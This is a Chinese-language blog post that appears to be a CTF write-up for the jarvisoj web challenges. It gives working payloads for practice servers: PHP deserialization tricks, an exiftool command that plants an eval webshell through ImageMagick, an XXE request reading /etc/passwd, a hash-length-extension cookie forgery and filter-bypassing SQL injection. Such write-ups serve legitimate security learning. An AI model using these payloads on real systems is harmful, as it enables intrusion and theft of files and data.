---
layout: post
title: jarvisoj web writeup
category: writeup
tags: ctf
description:
---

0x00 引子
----
jarvisoj浙江大学系统安全实验室(USS Lab.)学生Jarvis所开发的一个CTF在线答题系统.
发现适合我这样的小菜玩于是花了一些时间玩了玩.

0x01 PHPINFO 300
----

打开入口出现如下代码


<!--more-->


```
<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }
    
    function __destruct()
    {
        eval($this->mdzz);
    }
}
if(isset($_GET['phpinfo']))
{
    $m = new OowoO();
}
else
{
    highlight_string(file_get_contents('index.php'));
}
?>
```
关键点是这Session序列化及反序列化处理器[链接][1]
```
ini_set('session.serialize_handler', 'php');
```

PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式：

![session.png][2]

配置选项 session.serialize_handler
PHP 提供了 session.serialize_handler 配置选项，通过该选项可以设置序列化及反序列化时使用的处理器：

session.serialize_handler &quot;php&quot; PHP_INI_ALL

安全隐患
通过上面对存储格式的分析，如果 PHP 在反序列化存储的 $_SESSION 数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据：）

然后就是需要找个地方控制session
于是扫了半天有个phpinfo 发现禁用了很多函数

![QQ截图20161229180252.png][3]

于是在官网找到了
http://php.net/manual/zh/session.upload-progress.php
功能是把文件的上传进度记录到session里面。用官网的改改就行
```
<form action="upload.php" method="POST" enctype="multipart/form-data">
 <input type="hidden" name="<?php echo ini_get("session.upload_progress.name"); ?>" value="123" />
 <input type="file" name="file1" />
 <input type="file" name="file2" />
 <input type="submit" />
</form>
```
然后是构造payload 测试发现禁用了很多函数 也没写成功文件 用scandir 和file_get_contents得到了flag

```
<?php
class OowoO
{
    public $mdzz;
    function __construct()
    {
       // $this->mdzz = 'phpinfo();';
	    $this->mdzz = 'print_r(scandir("/opt/lampp/htdocs"));'; 
        //$this->mdzz = 'print_r(file_get_contents("/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"));';
    }
    
    function __destruct()
    {
        //eval($this->mdzz);
    }
}
$m = new OowoO();
echo serialize($m);
?>
```
![flag0.png][4]

然后用file_get_contents读到flag就行.


----------


0x01 图片上传漏洞 500
----
打开入口发现是个上传图片的 发现只能上传图片
然后扫到个test.php
发现有ImageMagick还是存在漏洞的
![web2.png][5]

于是找了一下
http://www.2cto.com/article/201605/505823.html
发现exif信息也能触发漏洞
ccf 中的web题
hint1:hidden parameter'image'
先用exiftool生成一个一句话后门 路径由phpinfo得到
```
exiftool -label="\"|/bin/echo \<?php \@eval\(\\$\_POST\[x\]\)\;?\> > /opt/lampp/htdocs/uploads/x.php; \"" 20161113150830.png
```
注意这里$是需要转义两次的 意思是要在图片里面带有一个\ 这样在服务器上echo写入的时候才会保留$

先上传一次带有后门的图片得到图片路径 然后拼接在发包一次修改filetype的参数为show或者win
![flag.png][6]

上菜刀得到falg

![flag2.png][7]

----------
0x02 api调用 100
----

打开发现
Content-Type: application/json
环境是python
需要读取flag吧 猜测是不是xxe 然后搜到了
http://bobao.360.cn/learning/detail/360.html
Content-Type头被修改为application/xml，客户端会告诉服务器post过去的数据是XML格式的.
加一个Content-Type: application/xml
payload
```
POST /api/v1.0/try HTTP/1.1
Host: web.jarvisoj.com:9882
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Accept: application/json
Content-Type: application/xml
Referer: http://web.jarvisoj.com:9882/
Content-Length: 165
X-Forwarded-For: 10.16.13.91
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE netspi [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<search>name</search>
<value>&xxe;</value>
</root>
```
![xxe.png][8]

然后读到flag

--------

0x03 Simple Injection 350
--
0x04 Easy Gallery 350
--
0x05 Chopper 500
--

参考https://www.scanfsec.com/iscc2016-web-writeup.html
-------

0x06 flag在管理员手里 350
--
发现没提示就找大佬要了一份源码
```
<!DOCTYPE html>
<html>
<head>
<title>Web 350</title>
<style type="text/css">
    body {
        background:gray;
        text-align:center;
    }
</style>
</head>

<body>
    <?php
        $auth = false;
        $role = "guest";
        $salt =
        if (isset($_COOKIE["role"])) {
            $role = unserialize($_COOKIE["role"]);
            $hsh = $_COOKIE["hsh"];
            if ($role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"]))) {
                $auth = true;
            } else {
                $auth = false;
            }
        } else {
            $s = serialize($role);
            setcookie('role',$s);
            $hsh = md5($salt.strrev($s));
            setcookie('hsh',$hsh);
        }
        if ($auth) {
            echo "<h3>Welcome Admin. Your flag is
        } else {
            echo "<h3>Only Admin can see the flag!!</h3>";
        }
    ?>

</body>
</html>
```
似曾相似``md5($salt.strrev($_COOKIE["role"]))``
https://blog.skullsecurity.org/2014/plaidctf-web-150-mtpox-hash-extension-attack
https://ricterz.me/posts/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90
可以得到
```
GET / HTTP/1.1
Host: web.jarvisoj.com:32778
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: role=s%3A5%3A%22admin%22%3B%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3A5%3A%22guest%22%3B; hsh=fcdc3840332555511c4e4323f6decb07
Connection: keep-alive
Upgrade-Insecure-Requests: 1

```
![aa.png][9]




---------
0x07 RE? 300
--

发现是udf.so 然后导入mysql中 
help_me看了一下函数功能 
然后得到了flag

---------
0x08 IN A Mess 500
--
index.phps
```
<?php

error_reporting(0);
echo "<!--index.phps-->";

if(!$_GET['id'])
{
	header('Location: index.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'Hahahahahaha';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	require("flag.txt");
}
else
{
	print "work harder!harder!harder!";
}


?>
```
随便输入一个不是数字绕过id；data伪协议绕过stripos；00截断eregi。
然后返回一个路径ï»¿Come ON!!! {/^HT2mCpcvOLf}
```
POST /index.php?id=a&a=php://input&b=%00233333 HTTP/1.1
Host: web.jarvisoj.com:32780
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=uj107nfovv3on10uca868uam15
X-Forwarded-For: 10.16.13.91
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

1112 is a nice lab!
```

得到一个注入
测试发现过滤了空格 用``/*aaa*/``绕过
然后发现要吃掉语句使用双写语句绕过
最终payload
```
http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1/*aaaa*/and/*111*/1=2/*aaa*/uniunionon/*bbbb*/selselectect/*aaabb*/1,2,context/*vvvv*/frfromom/*aaabbbb*/content
```
--------
0x09 神盾局的秘密 300
--
base64 可以读到源码
index.php
```
<?php 
	require_once('shield.php');
	$x = new Shield();
	isset($_GET['class']) && $g = $_GET['class'];
	if (!empty($g)) {
		$x = unserialize($g);
	}
	echo $x->readfile();
?>
<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>
```
shield.php
```
<?php
	//flag is in pctf.php
	class Shield {
		public $file;
		function __construct($filename = '') {
			$this -> file = $filename;
		}
		
		function readfile() {
			if (!empty($this->file) && stripos($this->file,'..')===FALSE  
			&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
				return @file_get_contents($this->file);
			}
		}
	}
?>
```
可以发现在index中$x = unserialize($g);
说明这是一个反序列读pctf.php文件的题
于是构造payload
```
<?php
	//flag is in pctf.php
	class Shield {
		public $file;
		function __construct($filename = 'pctf.php') {
			$this -> file = $filename;
		}
	}
$m = new Shield();
echo serialize($m);
?>
```
![aaa.png][10]

--------
0x10 Login 250
--

在header里面发现
```
Hint: "select * from `admin` where password='".md5($pass,true)."'"
```
google到了
http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/
于是拿到flag

--------
0x11 LOCALHOST 150
--
提示要本地访问
```
加上
X-Forwarded-For: 127.0.0.1
```
得到flag

--------------
0x12 PORT51 100
--
51端口访问
curl --local-port 51 web.jarvisoj.com:32770
得到flag


  [1]: http://www.tuicool.com/articles/zEfuEz
  [2]: https://img.scanfsec.com/img/2016122082157378.png
  [3]: https://img.scanfsec.com/img/2016123993631644.png
  [4]: https://img.scanfsec.com/img/2016123187191897.png
  [5]: https://img.scanfsec.com/img/2016123272738253.png
  [6]: https://img.scanfsec.com/img/2016122761767173.png
  [7]: https://img.scanfsec.com/img/2016121231310862.png
  [8]: https://img.scanfsec.com/img/201612887644193.png
  [9]: https://img.scanfsec.com/img/201612259069001.png
  [10]: https://img.scanfsec.com/img/2016122467216741.png
